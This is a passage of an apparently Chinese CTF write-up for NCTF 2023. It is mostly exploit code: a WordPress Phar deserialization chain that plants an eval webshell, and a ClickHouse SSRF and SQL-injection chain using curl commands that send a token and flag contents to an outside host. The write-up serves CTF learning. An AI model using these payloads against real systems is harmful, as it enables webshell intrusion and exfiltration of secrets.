100.00% Time: 00:00:01</span><span class="hljs-string"></span><span class="hljs-string">[i] No Config Backups Found.</span><span class="hljs-string"></span><span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><span class="hljs-string"></span><span class="hljs-string">[+] Finished: Sat Dec 23 17:24:38 2023</span><span class="hljs-string">[+] Requests Done: 174</span><span class="hljs-string">[+] Cached Requests: 5</span><span class="hljs-string">[+] Data Sent: 51.165 KB</span><span class="hljs-string">[+] Data Received: 286.203 KB</span><span class="hljs-string">[+] Memory used: 313.406 MB</span><span class="hljs-string">[+] Elapsed time: 00:00:06</span></code></pre></div><p>因为 WordPress 自身几乎很少出现过高危漏洞, 所以实战中针对 WordPress 站点的渗透一般都是<strong>第三方主题和插件</strong>, 于是就找了几个有意思的插件, 配合第二条链的 Phar 反序列化<strong>组合利用</strong>实现 RCE</p><p>WordPress 版本 6.4.1     存在pop链</p><p>Drag and Drop Multiple File Upload 插件, 版本 1.3.6.2, 存在存储型 XSS, <strong>本质是可以未授权上传图片</strong></p><p>All-in-One Video Gallery Plugin 插件, 版本 2.6.0, 存在未授权任意文件下载 &#x2F; SSRF      CVE-2022-2633</p><p>上传图片 -&gt; 上传 Phar -&gt; 任意文件下载 &#x2F; SSRF -&gt; 触发 Phar 反序列化</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> &#123;    <span class="hljs-title class_">class</span> <span class="hljs-title class_">WP_HTML_Token</span>     &#123;        <span class="hljs-title class_">public</span> $<span class="hljs-title class_">bookmark_name</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$on_destroy</span>;                <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$bookmark_name</span>, <span class="hljs-variable">$on_destroy</span></span>) </span><span class="hljs-function">        </span>&#123;            <span class="hljs-variable language_">$this</span>-&gt;bookmark_name = <span class="hljs-variable">$bookmark_name</span>;            <span class="hljs-variable language_">$this</span>-&gt;on_destroy = <span class="hljs-variable">$on_destroy</span>;        &#125;    &#125;    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WP_HTML_Token</span>(<span class="hljs-string">&#x27;echo \&#x27;&lt;?=eval($_POST[1]);?&gt;\&#x27; &gt; /var/www/html/shell.php&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>);    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);     <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89A&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;</span>);    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>自己写个上传文件的点</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wp-admin/admin-ajax.php</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>124.71.184.68:8012<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>870<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://124.71.184.68:8012<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryf1M94EpsxN3xWdZQ<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://124.71.184.68:8012/wp-admin/admin-ajax.php<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>aiovg_rand_seed=901849345<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryf1M94EpsxN3xWdZQ</span></span><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload-file&quot;; filename=&quot;test.jpg&quot;</span><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpeg</span><span class="language-pgsql"></span><span class="language-pgsql">phar.phar的文件内容</span><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryf1M94EpsxN3xWdZQ</span></span><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;size_limit&quot;</span><span class="language-pgsql"></span><span class="language-pgsql"><span class="hljs-number">10485760</span></span><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryf1M94EpsxN3xWdZQ</span></span><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;action&quot;</span><span class="language-pgsql"></span><span class="language-pgsql">dnd_codedropz_upload</span><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryf1M94EpsxN3xWdZQ</span></span><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;type&quot;</span><span class="language-pgsql"></span><span class="language-pgsql">click</span><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryf1M94EpsxN3xWdZQ--</span></span></code></pre></div><div class="code-wrapper"><pre><code class="hljs awk">访问<span class="hljs-regexp">/index.php/</span>video/?dl=cGhhcjovLy92YXIvd3d3L2h0bWwvd3AtY29udGVudC91cGxvYWRzL3dwX2RuZGNmN191cGxvYWRzL3dwY2Y3LWZpbGVzL3Rlc3QuanBnL3Rlc3QudHh0<span class="hljs-regexp">//</span>base64解码后的内容是<span class="hljs-regexp">//</span>phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>wp-content<span class="hljs-regexp">/uploads/</span>wp_dndcf7_uploads<span class="hljs-regexp">/wpcf7-files/</span>test.jpg/test.txt<span class="hljs-regexp">//</span>一定要带上test.txt</code></pre></div><p>就成功写入木马</p><p>连上webshell，没有权限读取flag，suid提权</p><p><img src="/../images/NCTF2023/image-20231229001555068.png" alt="image-20231229001555068"></p><h2 id="house-of-click"><a href="#house-of-click" class="headerlink" title="house of click"></a>house of click</h2><p>看官方WP吧，我就复现一下，链接放在最后</p><p>Clickhouse数据库</p><p>nginx + gunicorn 路径绕过</p><p><a href="https://mp.weixin.qq.com/s/yDIMgXltVLNfslVGg9lt4g">https://mp.weixin.qq.com/s/yDIMgXltVLNfslVGg9lt4g</a></p><p>有个查询url的用法</p><p><a href="https://clickhouse.com/docs/en/sql-reference/table-functions/url">https://clickhouse.com/docs/en/sql-reference/table-functions/url</a></p><div class="code-wrapper"><pre><code class="hljs vhdl"><span class="hljs-keyword">select</span> * from url(<span class="hljs-symbol">&#x27;http</span>://ip:<span class="hljs-keyword">port</span>/&#x27;,<span class="hljs-symbol">&#x27;TabSeparatedRaw</span>&#x27;,<span class="hljs-symbol">&#x27;x</span> <span class="hljs-built_in">String</span>&#x27;))<span class="hljs-keyword">select</span> * from url(<span class="hljs-symbol">&#x27;http</span>://ip:<span class="hljs-keyword">port</span>/&#x27;,CSV,<span class="hljs-symbol">&#x27;a</span> <span class="hljs-built_in">String</span>&#x27;))</code></pre></div><div class="code-wrapper"><pre><code class="hljs SQL">POST <span class="hljs-operator">/</span>queryHTTP<span class="hljs-operator">/</span><span class="hljs-number">1.1</span><span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>api<span class="hljs-operator">/</span>ping HTTP<span class="hljs-operator">/</span><span class="hljs-number">1.1</span>      <span class="hljs-operator">/</span><span class="hljs-operator">/</span>(query后面有制表符)Host: <span class="hljs-number">124.71</span><span class="hljs-number">.184</span><span class="hljs-number">.68</span>:<span class="hljs-number">8013</span>Connection: <span class="hljs-keyword">close</span>Content<span class="hljs-operator">-</span>Type: application<span class="hljs-operator">/</span>x<span class="hljs-operator">-</span>www<span class="hljs-operator">-</span>form<span class="hljs-operator">-</span>urlencodedContent<span class="hljs-operator">-</span>Length: <span class="hljs-number">187</span>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> url(<span class="hljs-string">&#x27;http://vps_ip:port/?a=&#x27;</span><span class="hljs-operator">||</span>hex((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> url(<span class="hljs-string">&#x27;http://backend:8001/api/token&#x27;</span>, <span class="hljs-string">&#x27;TabSeparatedRaw&#x27;</span>, <span class="hljs-string">&#x27;x String&#x27;</span>))), <span class="hljs-string">&#x27;TabSeparatedRaw&#x27;</span>, <span class="hljs-string">&#x27;x String&#x27;</span>));</code></pre></div><p><img src="/../images/NCTF2023/image-20231230023835206.png" alt="image-20231230023835206"></p><p>记得hex解码</p><div class="code-wrapper"><pre><code class="hljs oxygene">-- ssti <span class="hljs-keyword">to</span> rceINSERT <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">FUNCTION</span> <span class="hljs-title function_">url</span><span class="hljs-params">(<span class="hljs-string">&#x27;http://backend:8001/api/upload&#x27;</span>, <span class="hljs-string">&#x27;TabSeparatedRaw&#x27;</span>, <span class="hljs-string">&#x27;x String&#x27;</span>, headers(<span class="hljs-string">&#x27;Content-Type&#x27;</span>=<span class="hljs-string">&#x27;multipart/form-data; boundary=----test&#x27;</span>, <span class="hljs-string">&#x27;X-Access-Token&#x27;</span>=<span class="hljs-string">&#x27;06a181b5474d020c2237cea4335ee6fd&#x27;</span>)</span>) <span class="hljs-title function_">VALUES</span> <span class="hljs-params">(<span class="hljs-string">&#x27;------test\r\nContent-Disposition: form-data; name=&quot;myfile&quot;; filename=&quot;../templates/test.html&quot;\r\nContent-Type: text/plain\r\n\r\n$code:\r\n    __import__(\&#x27;</span>os\<span class="hljs-string">&#x27;).system(\&#x27;</span>curl http://vps_ip:port/?flag=`/readflag | base64`\<span class="hljs-string">&#x27;)\r\n------test--&#x27;</span>)</span>;</code></pre></div><p>有几个细节</p><p>CSV方式上传文件是被双引号包裹</p><p><img src="/../images/NCTF2023/image-20231230022919705.png" alt="image-20231230022919705"></p><p>第二</p><div class="code-wrapper"><pre><code class="hljs autoit">$code:\r\n    __import__(\<span class="hljs-string">&#x27;os\&#x27;</span>)</code></pre></div><p>换行和<code>__import__</code>之间有<strong>制表符</strong></p><p><a href="https://webpy.org/docs/0.3/templetor.zh-cn">https://webpy.org/docs/0.3/templetor.zh-cn</a></p><div class="code-wrapper"><pre><code class="hljs HTML">$code:    __import__(&#x27;os&#x27;).system(&#x27;curl http://vps_ip:port/?flag=`/readflag | base64`&#x27;)</code></pre></div><p>第三</p><p>题目中我们select中不能使用insert语句。这里又涉及到clickhouse的http interface，我们可以通过请求<code>http://default:default@db:8123/?query=&lt;SQL&gt; </code>执行任意SQL语句</p><p>把payload二次URL编码放入<code>&lt;SQL&gt;</code>的位置即可</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/queryHTTP/1.1/../../api/ping</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>124.71.184.68:8013<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<span class="language-llvm"></span><span class="language-llvm">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> * from url(&#x27;http://<span class="hljs-keyword">default</span>:<span class="hljs-keyword">default</span><span class="hljs-title">@db</span>:<span class="hljs-number">8123</span>/?query<span class="hljs-operator">=</span><span class="hljs-variable">%2549</span><span class="hljs-variable">%254</span>e<span class="hljs-variable">%2553</span><span class="hljs-variable">%2545</span><span class="hljs-variable">%2552</span><span class="hljs-variable">%2554</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2549</span><span class="hljs-variable">%254</span>e<span class="hljs-variable">%2554</span><span class="hljs-variable">%254</span>f<span class="hljs-variable">%2520</span><span class="hljs-variable">%2546</span><span class="hljs-variable">%2555</span><span class="hljs-variable">%254</span>e<span class="hljs-variable">%2543</span><span class="hljs-variable">%2554</span><span class="hljs-variable">%2549</span><span class="hljs-variable">%254</span>f<span class="hljs-variable">%254</span>e<span class="hljs-variable">%2520</span><span class="hljs-variable">%2575</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2528</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%253</span>a<span class="hljs-variable">%252</span>f<span class="hljs-variable">%252</span>f<span class="hljs-variable">%2562</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2563</span><span class="hljs-variable">%256</span>b<span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2564</span><span class="hljs-variable">%253</span>a<span class="hljs-variable">%2538</span><span class="hljs-variable">%2530</span><span class="hljs-variable">%2530</span><span class="hljs-variable">%2531</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%2561</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%2575</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2561</span><span class="hljs-variable">%2564</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%252</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2554</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2562</span><span class="hljs-variable">%2553</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2564</span><span class="hljs-variable">%2552</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2577</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%252</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2578</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2553</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2567</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%252</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2564</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2528</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2543</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%256</span>e<span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2574</span><span class="hljs-variable">%252</span>d<span class="hljs-variable">%2554</span><span class="hljs-variable">%2579</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%253</span>d<span class="hljs-variable">%2527</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2575</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%2566</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2572</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%2564</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%253</span>b<span class="hljs-variable">%2520</span><span class="hljs-variable">%2562</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2575</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2564</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%2579</span><span class="hljs-variable">%253</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%252</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2558</span><span class="hljs-variable">%252</span>d<span class="hljs-variable">%2541</span><span class="hljs-variable">%2563</span><span class="hljs-variable">%2563</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%252</span>d<span class="hljs-variable">%2554</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%256</span>b<span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2527</span><span class="hljs-variable">%253</span>d<span class="hljs-variable">%2527</span><span class="hljs-variable">%2533</span><span class="hljs-variable">%2536</span><span class="hljs-variable">%2530</span><span class="hljs-variable">%2534</span><span class="hljs-variable">%2534</span><span class="hljs-variable">%2564</span><span class="hljs-variable">%2536</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2539</span><span class="hljs-variable">%2539</span><span class="hljs-variable">%2537</span><span class="hljs-variable">%2530</span><span class="hljs-variable">%2538</span><span class="hljs-variable">%2534</span><span class="hljs-variable">%2534</span><span class="hljs-variable">%2536</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2532</span><span class="hljs-variable">%2536</span><span class="hljs-variable">%2539</span><span class="hljs-variable">%2562</span><span class="hljs-variable">%2530</span><span class="hljs-variable">%2533</span><span class="hljs-variable">%2539</span><span class="hljs-variable">%2538</span><span class="hljs-variable">%2566</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2533</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2562</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2529</span><span class="hljs-variable">%2529</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2556</span><span class="hljs-variable">%2541</span><span class="hljs-variable">%254</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2555</span><span class="hljs-variable">%2545</span><span class="hljs-variable">%2553</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2528</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2543</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%256</span>e<span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2574</span><span class="hljs-variable">%252</span>d<span class="hljs-variable">%2544</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2573</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%256</span>e<span class="hljs-variable">%253</span>a<span class="hljs-variable">%2520</span><span class="hljs-variable">%2566</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2572</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%2564</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%253</span>b<span class="hljs-variable">%2520</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2561</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2565</span><span class="hljs-variable">%253</span>d<span class="hljs-variable">%2522</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2579</span><span class="hljs-variable">%2566</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2522</span><span class="hljs-variable">%253</span>b<span class="hljs-variable">%2520</span><span class="hljs-variable">%2566</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2561</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2565</span><span class="hljs-variable">%253</span>d<span class="hljs-variable">%2522</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%252</span>e<span class="hljs-variable">%252</span>f<span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2570</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%2568</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2522</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2543</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%256</span>e<span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2574</span><span class="hljs-variable">%252</span>d<span class="hljs-variable">%2554</span><span class="hljs-variable">%2579</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%253</span>a<span class="hljs-variable">%2520</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2578</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%2570</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2524</span><span class="hljs-variable">%2563</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2564</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%253</span>a<span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2520</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%255</span>f<span class="hljs-variable">%255</span>f<span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2570</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2572</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%255</span>f<span class="hljs-variable">%255</span>f<span class="hljs-variable">%2528</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2573</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2529</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%2573</span><span class="hljs-variable">%2579</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2528</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2563</span><span class="hljs-variable">%2575</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%253</span>a<span class="hljs-variable">%252</span>f<span class="hljs-variable">%252</span>f<span class="hljs-variable">%2531</span><span class="hljs-variable">%2531</span><span class="hljs-variable">%2538</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%2538</span><span class="hljs-variable">%2539</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%2536</span><span class="hljs-variable">%2531</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%2537</span><span class="hljs-variable">%2531</span><span class="hljs-variable">%253</span>a<span class="hljs-variable">%2537</span><span class="hljs-variable">%2537</span><span class="hljs-variable">%2537</span><span class="hljs-variable">%2537</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%253</span>f<span class="hljs-variable">%2566</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2567</span><span class="hljs-variable">%253</span>d<span class="hljs-variable">%2560</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%2572</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2564</span><span class="hljs-variable">%2566</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2567</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%257</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2562</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2536</span><span class="hljs-variable">%2534</span><span class="hljs-variable">%2560</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2529</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%2527</span><span class="hljs-variable">%2529</span><span class="hljs-variable">%253</span>b&#x27;<span class="hljs-punctuation">,</span>&#x27;TabSeparatedRaw&#x27;<span class="hljs-punctuation">,</span>&#x27;<span class="hljs-keyword">x</span> String&#x27;))</span></code></pre></div><p>文件上传成功，最后post请求&#x2F;，同样还要经过nginx反向代理</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/HTTP/1.1/../../api/ping</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>124.71.184.68:8013<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span><span 